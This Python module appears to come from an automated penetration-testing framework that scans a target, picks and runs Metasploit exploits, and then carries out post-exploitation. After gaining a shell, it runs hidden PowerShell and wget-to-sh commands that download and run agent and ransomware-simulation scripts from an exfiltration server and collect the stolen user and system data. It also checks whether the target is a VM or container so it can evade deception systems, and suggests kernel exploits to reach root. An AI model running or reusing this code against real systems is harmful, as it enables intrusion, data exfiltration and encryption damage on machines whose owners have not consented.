#!/usr/bin/env python3
import json
import utils
import threading
import time
import sys
import os
import requests
import queue
from utils import PPrint
PATH = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(PATH)
import config
import service_scan
import scan_cluster
import msf_wrapper
import a3c_classes
import second_mode


def get_secondary_options(scan_results):
    memory = second_mode.MemoryModel()
    results = []
    for port in scan_results["ports"]:
        data = scan_results["service_details"][str(port)]
        exploits = memory.play(data['product'])
        results.append([port, exploits])
    return results


def get_recommended_exploit(scan_results, target):
    scan_results = utils.load_scan(target)
    master = a3c_classes.MasterAgent(target)
    exploits = master.play(scan_results)
    return exploits


def exploitation_mode(target, use_cached_service_scan=False, ransomware_simulation=False, deception_detection=False, secondary_mode=False):
    PPrint().info("Target:> {target}".format(target=target))

    PPrint().info("Service Scan started at [{target}]".format(target=target))
    service_scan_task(target, return_cached_scan=use_cached_service_scan)
    PPrint().info("Service Scan finished at [{target}]".format(target=target))

    scan_results = utils.load_scan(target)
    if secondary_mode:
        exploits = get_secondary_options(scan_results)
    else:
        exploits = get_recommended_exploit(scan_results, target)

    exploitation_result = {"result": False}
    for port_exploits_array in exploits:
        for exploit in port_exploits_array[1]:
            try:
                exploitation_result = msf_wrapper.run_exploit(target,
                                                              exploit,
                                                              port_exploits_array[0],
                                                              close_session_after_detection=False,
                                                              attempt_to_upgrade_shell=True)
                if exploitation_result["result"]:
                    break
            except Exception as e:
                PPrint().error(e)
                continue
        if exploitation_result["result"]:
            break

    if exploitation_result["result"]:
        PPrint().success("Pwned!")
    else:
        PPrint().error("Exploit did not work.")
        return None
    if exploitation_result["upgrade_shell"] or exploitation_result["type"] == "meterpreter":
        PPrint().success("Shell Upgraded!")

    uuid = utils.uuidgen()

    is_post_exploitation_error = None

    PPrint().info("Loading stdapi and sleeping for 10 seconds.")
    msf_wrapper.execute_load_stdapi_on_meterpreter_session(exploitation_result["meterpreter_session_id"])
    time.sleep(10)

    if deception_detection:
        PPrint().info("Deception detection mode is enabled.")

    # Windows
    if scan_results["osname"] == "windows" or scan_results["osname"] == "microsoft":
        # Deception detection
        if deception_detection:
            if exploitation_result["meterpreter_session_id"] is None:
                PPrint().info("Deception detection requires Meterpreter shell.")
                PPrint().info("Exiting...")
                sys.exit(4)

            resp = msf_wrapper.execute_meterpreter_post_module(exploitation_result["meterpreter_session_id"], "post/windows/gather/checkvm")
            if "appears to be a Physical Machine" not in resp:
                PPrint().success("This machine appears to be a Virtual Machine.")
                PPrint().info("Terminating exploitation for anti-deception purposes.")
                sys.exit(4)
            else:
                PPrint().info("Deception detection check passes.")
                PPrint().info("Continuing post-exploitation.")

        cmd = "powershell.exe -nop -w hidden -c (New-Object Net.WebClient).DownloadString('http://{server}/data/{uuid}/ping');".format(server=config.EXFILTRATION_SERVER, uuid=uuid)

        if exploitation_result["type"] == "meterpreter":
            msf_wrapper.execute_command_on_meterpreter(exploitation_result["session_id"], cmd)
        elif exploitation_result["type"] == "shell":
            msf_wrapper.execute_command_on_shell(exploitation_result["session_id"], cmd)
        else:
            PPrint().info("Unable to identify Shell Type.")
            is_post_exploitation_error = True

        if is_post_exploitation_error:
            report_path = utils.generate_exploitation_report(target, exploitation_result, [])
            PPrint().success("Report generated at: [{report_path}]".format(report_path=report_path))
            return(0)

        time.sleep(10)

        if requests.get("http://{server}/data/{uuid}/status".format(server=config.EXFILTRATION_SERVER, uuid=uuid)).text == "true":
            PPrint().success("Out-of-Band call to Exfiltration Server succeeded!")
        else:
            PPrint().info("Unable to connect to exfiltration server.")
            is_post_exploitation_error = True

        if is_post_exploitation_error:
            report_path = utils.generate_exploitation_report(target, exploitation_result, [])
            PPrint().success("Report generated at: [{report_path}]".format(report_path=report_path))
            return(0)

        cmd = "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://{server}/agent.ps1'); Invoke-Shennina-Exfiltration-Agent {server} {uuid}".format(server=config.EXFILTRATION_SERVER, uuid=uuid)
        if exploitation_result["type"] == "meterpreter":
            msf_wrapper.execute_command_on_meterpreter(exploitation_result["session_id"], cmd)
        elif exploitation_result["type"] == "shell":
            msf_wrapper.execute_command_on_shell(exploitation_result["session_id"], cmd)
        else:
            PPrint().info("Unable to identify Shell Type.")
            is_post_exploitation_error = True

        if is_post_exploitation_error:
            report_path = utils.generate_exploitation_report(target, exploitation_result, [])
            PPrint().success("Report generated at: [{report_path}]".format(report_path=report_path))
            return(0)

        time.sleep(15)

        if requests.get("http://{server}/data/{uuid}/exfiltration-status".format(server=config.EXFILTRATION_SERVER, uuid=uuid)).text == "true":
            PPrint().success("Out-of-Band exfiltration succeeded!")
        else:
            PPrint().info("Out-of-Band exfiltration failed.")
            is_post_exploitation_error = True

        if is_post_exploitation_error:
            report_path = utils.generate_exploitation_report(target, exploitation_result, [])
            PPrint().success("Report generated at: [{report_path}]".format(report_path=report_path))
            return(0)

        if ransomware_simulation:
            cmd = "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://{server}/ransomware-simulation.ps1');  Invoke-Shennina-Ransomware-Simulation".format(server=config.EXFILTRATION_SERVER)
            if exploitation_result["type"] == "meterpreter":
                msf_wrapper.execute_command_on_meterpreter(exploitation_result["session_id"], cmd)
            elif exploitation_result["type"] == "shell":
                msf_wrapper.execute_command_on_shell(exploitation_result["session_id"], cmd)
            else:
                PPrint().info("Unable to identify Shell Type.")
                is_post_exploitation_error = True

            if not is_post_exploitation_error:
                PPrint().success("Ransomware Simulation executed Successfully on target")

            if is_post_exploitation_error:
                report_path = utils.generate_exploitation_report(target, exploitation_result, [])
                PPrint().success("Report generated at: [{report_path}]".format(report_path=report_path))
                return(0)

        exfiltration_output = requests.get("http://{server}/data/{uuid}/details".format(server=config.EXFILTRATION_SERVER,
                                                                                        uuid=uuid)).text
        exfiltration_output = json.loads(exfiltration_output)

    # Linux / macOS
    if (scan_results["osname"] != "windows") and (scan_results["osname"] != "microsoft"):
        # Deception detection
        if deception_detection:
            detect_deception_result = True
            if exploitation_result["meterpreter_session_id"] is None:
                PPrint().info("Deception detection requires Meterpreter shell.")
                PPrint().info("Exiting...")
                sys.exit(4)

            resp = msf_wrapper.execute_meterpreter_post_module(exploitation_result["meterpreter_session_id"], "post/linux/gather/checkvm")

            if "This does not appear to be a virtual machine" in resp:
                detect_deception_result = False

            resp = msf_wrapper.execute_meterpreter_post_module(exploitation_result["meterpreter_session_id"], "post/linux/gather/checkcontainer")

            if "This does not appear to be a container" in resp:
                detect_deception_result = False

            if detect_deception_result:
                PPrint().success("This machine appears to be a Virtual Machine/Container.")
                PPrint().info("Terminating exploitation for anti-deception purposes.")
                sys.exit(4)
            else:
                PPrint().info("Deception detection check passes.")
                PPrint().info("Continuing post-exploitation.")

        cmd = 'wget -O- http://{server}/data/{uuid}/ping'.format(server=config.EXFILTRATION_SERVER,
                                                                 uuid=uuid)
        if exploitation_result["type"] == "meterpreter":
            msf_wrapper.execute_command_on_meterpreter(exploitation_result["session_id"], cmd)
        elif exploitation_result["type"] == "shell":
            msf_wrapper.execute_command_on_shell(exploitation_result["session_id"], cmd)
        else:
            PPrint().info("Unable to identify Shell Type.")
            is_post_exploitation_error = True

        if is_post_exploitation_error:
            report_path = utils.generate_exploitation_report(target, exploitation_result, [])
            PPrint().success("Report generated at: [{report_path}]".format(report_path=report_path))
            return(0)

        time.sleep(4)
        if requests.get("http://{server}/data/{uuid}/status".format(server=config.EXFILTRATION_SERVER, uuid=uuid)).text == "true":
            PPrint().success("Out-of-Band call to Exfiltration Server succeeded!")
        else:
            PPrint().error("Unable to connect to exfiltration server.")
            is_post_exploitation_error = True

        if is_post_exploitation_error:
            report_path = utils.generate_exploitation_report(target, exploitation_result, [])
            PPrint().success("Report generated at: [{report_path}]".format(report_path=report_path))
            return(0)

        if exploitation_result["type"] == "meterpreter":
            cmd = 'wget -O /tmp/.{uuid}.sh http://{server}/agent.sh '.format(server=config.EXFILTRATION_SERVER, uuid=uuid)
            msf_wrapper.execute_command_on_meterpreter(exploitation_result["session_id"], cmd)
            cmd = 'sh /tmp/.{uuid}.sh "{server}" "{uuid}" '.format(server=config.EXFILTRATION_SERVER, uuid=uuid)
            msf_wrapper.execute_command_on_meterpreter(exploitation_result["session_id"], cmd)
            cmd = 'rm /tmp/.{uuid}.sh'.format(uuid=uuid)
            msf_wrapper.execute_command_on_meterpreter(exploitation_result["session_id"], cmd)

        elif exploitation_result["type"] == "shell":
            cmd = 'wget -O- http://{server}/agent.sh | sh /dev/stdin "{server}" "{uuid}"'.format(server=config.EXFILTRATION_SERVER, uuid=uuid)
            msf_wrapper.execute_command_on_shell(exploitation_result["session_id"], cmd)
        else:
            PPrint().error("Unable to identify Shell Type.")
            is_post_exploitation_error = True

        if is_post_exploitation_error:
            report_path = utils.generate_exploitation_report(target, exploitation_result, [])
            PPrint().success("Report generated at: [{report_path}]".format(report_path=report_path))
            return(0)

        time.sleep(4)

        if requests.get("http://{server}/data/{uuid}/exfiltration-status".format(server=config.EXFILTRATION_SERVER, uuid=uuid)).text == "true":
            PPrint().success("Out-of-Band exfiltration succeeded!")
        else:
            PPrint().error("Out-of-Band exfiltration failed.")
            is_post_exploitation_error = True

        if is_post_exploitation_error:
            report_path = utils.generate_exploitation_report(target, exploitation_result, [])
            PPrint().success("Report generated at: [{report_path}]".format(report_path=report_path))
            return(0)

        if ransomware_simulation:
            if exploitation_result["type"] == "meterpreter":
                cmd = 'wget -O /tmp/.{uuid}.sh http://{server}/ransomware-simulation.sh'.format(server=config.EXFILTRATION_SERVER, uuid=uuid)
                msf_wrapper.execute_command_on_meterpreter(exploitation_result["session_id"], cmd)
                cmd = 'sh /tmp/.{uuid}.sh enc'.format(uuid=uuid)
                msf_wrapper.execute_command_on_meterpreter(exploitation_result["session_id"], cmd)
                cmd = 'rm /tmp/.{uuid}.sh'.format(uuid=uuid)
                msf_wrapper.execute_command_on_meterpreter(exploitation_result["session_id"], cmd)
            elif exploitation_result["type"] == "shell":
                cmd = "wget -O- http://{server}/ransomware-simulation.sh | sh /dev/stdin enc".format(server=config.EXFILTRATION_SERVER)
                msf_wrapper.execute_command_on_shell(exploitation_result["session_id"], cmd)
            else:
                PPrint().info("Unable to identify Shell Type.")
                is_post_exploitation_error = True

            if not is_post_exploitation_error:
                PPrint().success("Ransomware Simulation executed successfully on target")

            if is_post_exploitation_error:
                report_path = utils.generate_exploitation_report(target, exploitation_result, [])
                PPrint().success("Report generated at: [{report_path}]".format(report_path=report_path))
                return(0)

        exfiltration_output = requests.get("http://{server}/data/{uuid}/details".format(server=config.EXFILTRATION_SERVER,
                                                                                        uuid=uuid)).text
        exfiltration_output = json.loads(exfiltration_output)
        current_user = exfiltration_output["user"].strip()
        if current_user == "root":
            PPrint().success("We have received root access on {target}.".format(target=target))
        else:
            PPrint().info("We have the permissions for the ({username}) user on {target}.".format(target=target,
                                                                                                  username=current_user))
            PPrint().info("Analyzing and suggesting a probable Linux kernel exploit to obtain root access.")
            uname = exfiltration_output["uname"].strip()
            suggested_exploits = utils.execute_linux_exploit_suggester_tool(uname)
            exfiltration_output["suggested_exploits"] = suggested_exploits
            PPrint().success("Completed the probable Linux kernel exploit analysis for the target. Results are included in the report.")

    report_path = utils.generate_exploitation_report(target, exploitation_result, exfiltration_output)
    PPrint().success("Report generated at: [{report_path}]".format(report_path=report_path))


def service_scan_task(host, return_cached_scan=False):
    scan_path = utils.generate_scan_path(host)
    if return_cached_scan:
        PPrint().info("Using cached scan for [{target}]".format(target=host))
        return utils.load_scan(host)
    scan_result = service_scan.run(host)
    scan_result = scan_cluster.match_service_with_exploits(scan_result)
    f = open(scan_path, "w")
    f.write(json.dumps(scan_result, indent=4))
    f.close()
    return scan_result


def run_testing_worker(exploit_tests, queue_results, queue_failed_tests):
    for exploit_test in exploit_tests:
        test_output = msf_wrapper.run_exploit(exploit_test["host"],
                                              exploit_test["exploit_name"],
                                              exploit_test["port"])
        if test_output["result"]:
            PPrint().success("Pwned!")
            output = exploit_test
            output["type"] = test_output["type"]
            output["payload"] = test_output["payload"]
            output["session_id"] = test_output["session_id"]
            for _ in output.keys():
                print("- {}: {}".format(_, output[_]))
            queue_results.put(output)
        else:
            queue_failed_tests.put(exploit_test["exploit_name"])


def scan_target(target, use_cached_service_scan=False):
    PPrint().info("Target:> {target}".format(target=target))

    # Run TCP Port Scan
    PPrint().info("Service Scan started at [{target}]".format(target=target))
    service_scan_task(target, return_cached_scan=use_cached_service_scan)
    result = utils.load_scan(target)
    PPrint().info("Service Scan finished at [{target}]".format(target=target))
    exploits_testing_list = []
    for port in result["ports"]:
        for exploit in result["service_details"][str(port)]["exploits"]:
            data = result["service_details"][str(port)]
            exploits_testing_list.append({"exploit_name": exploit,
                                          "host": target,
                                          "port": port,
                                          "name": data["name"],
                                          "product": data["product"],
                                          "version": data["version"],
                                          "platform": result["osname"]
                                          })

    PPrint().info("Total number of exploits to test: {}".format(len(exploits_testing_list)))
    queue_results = queue.Queue()
    queue_failed_tests = queue.Queue()

    workers_input = []
    previous = 0
    p = len(exploits_testing_list) // config.MAX_TESTING_THREADS
    for _ in range(config.MAX_TESTING_THREADS + 1):
        first = previous
        last = previous + p
        workers_input.append(exploits_testing_list[first:last])
        previous = previous + p

    if config.MAX_TESTING_THREADS >= len(exploits_testing_list):
        workers_input = []  # Emptying the workers_input
        workers_input.append(exploits_testing_list)

    threads_state = []
    for exploit_test in workers_input:
        t = threading.Thread(target=run_testing_worker, args=(exploit_test,
                                                              queue_results,
                                                              queue_failed_tests,))
        t.start()
        threads_state.append(t)
    for t in threads_state:
        t.join()

    results_list = []
    failed_list = []
    while queue_results.empty() is False:
        results_list.append(queue_results.get())
    while queue_failed_tests.empty() is False:
        failed_list.append(queue_failed_tests.get())
    return results_list, failed_list


def vulnerability_scan_target(target, use_cached_service_scan=False):
    results_list, failed_list = scan_target(target, use_cached_service_scan=use_cached_service_scan)
    report_path = utils.generate_vulnerability_scan_report(target, results_list, failed_list)
    PPrint().success("Report generated at: [{report_path}]".format(report_path=report_path))
